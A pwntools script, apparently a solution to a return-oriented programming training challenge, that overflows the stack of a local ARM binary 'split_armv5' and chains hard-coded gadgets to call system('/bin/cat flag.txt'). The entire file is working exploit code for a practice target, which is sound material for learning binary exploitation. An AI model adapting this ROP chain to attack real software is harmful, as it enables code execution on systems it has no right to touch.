from pwn import *

context.arch = 'arm'
prog = process("./split_armv5")

# 0x000103a4: pop {r3, pc}
pop_0 = p32(0x000103a4)
# 0x00010644: pop {r4, r5, r6, r7, r8, sb, sl, pc}
pop_1 = p32(0x00010644)
# 0x00010634: mov r0, r7; blx r3;
mov_0 = p32(0x00010634)
# /bin/cat flag.txt
str_0 = p32(0x0002103c)
# 0x000105e0: bl sym.imp.system
sys_0 = p32(0x000105e0)

payload = b'a' * 36
payload += pop_0
payload += sys_0
payload += pop_1

payload += b'b'*4 + b'c'*4 + b'd'*4
payload += str_0 
payload += b'e'*4 + b'f'*4 + b'g'*4
payload += mov_0

print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
